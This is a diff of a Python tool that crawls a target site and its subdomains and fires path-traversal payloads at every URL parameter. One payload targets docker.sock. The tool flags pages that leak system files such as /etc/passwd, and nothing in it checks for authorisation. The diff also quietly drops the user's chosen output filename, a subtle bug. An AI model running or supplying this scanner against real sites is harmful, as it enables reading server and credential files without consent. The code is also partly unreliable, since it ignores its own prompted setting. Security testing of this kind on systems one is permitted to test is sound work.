@@ -1,10 +1,11 @@
 import requests
-from urllib.parse import urljoin, urlparse, urlencode, parse_qs
+from urllib.parse import urljoin, urlparse, urlencode, parse_qs, quote
 from bs4 import BeautifulSoup
 import tldextract
 from concurrent.futures import ThreadPoolExecutor
 import time
 import os
+import json
 
 # 🎯 Default LFI Payloads for testing
 payloads = [
@@ -77,8 +78,7 @@ payloads = [
     "../../../../../../../../var/run/docker.sock"
 ]
 
-
-# 🔁 Visited URLs to avoid duplicates
+# 🔀 Visited URLs to avoid duplicates
 visited_urls = set()
 output_results = []
 
@@ -89,6 +89,15 @@ def is_subdomain(url, domain):
     extracted_main = tldextract.extract(domain)
     extracted_url = tldextract.extract(url)
     return extracted_url.domain == extracted_main.domain and extracted_url.suffix == extracted_main.suffix
+
+def sanitize_url(url):
+    """
+    🔒 Ensure the URL is properly formatted and sanitized.
+    """
+    parsed = urlparse(url)
+    if not parsed.scheme:
+        url = "http://" + url
+    return url
 
 def find_urls(url, domain):
     """
@@ -131,16 +140,28 @@ def test_lfi(url):
 
                 # 🔎 Check if payload reflects in the response
                 if any(indicator in response.text.lower() for indicator in ["root:", "[boot loader]", "[extensions]", "[default]"]):
-                    result = f"✅ [VULNERABLE] Parameter '{param}' is vulnerable to LFI on {test_url}"
-                    print(result)
+                    result = {
+                        "status": "vulnerable",
+                        "url": test_url,
+                        "parameter": param,
+                        "payload": payload
+                    }
+                    print(f"✅ [VULNERABLE] {result}")
                     output_results.append(result)
                     return True
-        result = f"🛡️ [SAFE] No vulnerabilities found for {url}"
-        print(result)
+        result = {
+            "status": "safe",
+            "url": url
+        }
+        print(f"🛡️ [SAFE] {result}")
         output_results.append(result)
     except Exception as e:
-        error_message = f"❌ Error testing {url}: {e}"
-        print(error_message)
+        error_message = {
+            "status": "error",
+            "url": url,
+            "error": str(e)
+        }
+        print(f"❌ Error testing {url}: {e}")
         output_results.append(error_message)
     return False
 
@@ -154,16 +175,17 @@ def load_from_file(file_path):
     print(f"📂 Loaded {len(items)} items from {file_path}")
     return items
 
-def crawl_and_test(urls, output_file="lfi_results.txt", max_depth=3):
+def crawl_and_test(urls, output_file="lfi_results.json", max_depth=3):
     """
     🔍 Crawl a list of URLs and their subdomains to find potential LFI vulnerabilities.
     """
     for url in urls:
-        print(f"🚀 Starting crawl on URL: {url}")
-        urls_to_test = [url]
+        sanitized_url = sanitize_url(url)
+        print(f"🚀 Starting crawl on URL: {sanitized_url}")
+        urls_to_test = [sanitized_url]
         depth = 0
 
-        domain = urlparse(url).netloc
+        domain = urlparse(sanitized_url).netloc
 
         # ThreadPoolExecutor for parallel URL testing
         with ThreadPoolExecutor(max_workers=10) as executor:
@@ -186,7 +208,7 @@ def crawl_and_test(urls, output_file="lfi_results.txt", max_depth=3):
 
     # Save results to the output file automatically
     with open(output_file, 'w') as f:
-        f.write("\n".join(output_results))
+        json.dump(output_results, f, indent=4)
     print(f"\n📁 Results saved automatically to: {output_file}")
 
 if __name__ == "__main__":
@@ -202,17 +224,13 @@ if __name__ == "__main__":
         target_url = input("🔗 Enter the target URL (e.g., https://example.com): ")
         urls = [target_url]
 
-    output_file = input("📂 Enter the name of the output file (leave blank for default 'lfi_results.txt'): ").strip()
+    output_file = input("📂 Enter the name of the output file (leave blank for default 'lfi_results.json'): ").strip()
     payloads_option = input("📂 Do you want to load payloads from a .txt file? (y/n): ").lower()
-
     if payloads_option == 'y':
         payloads_file_path = input("📂 Enter the path to the .txt file containing payloads: ")
         payloads = load_from_file(payloads_file_path)
 
-    # Use default filename if none is provided
-    output_file = output_file if output_file else "lfi_results.txt"
-
     if urls:
-        crawl_and_test(urls, output_file)
+        crawl_and_test(urls)
     else:
         print("❌ Error: Please provide valid URLs.")
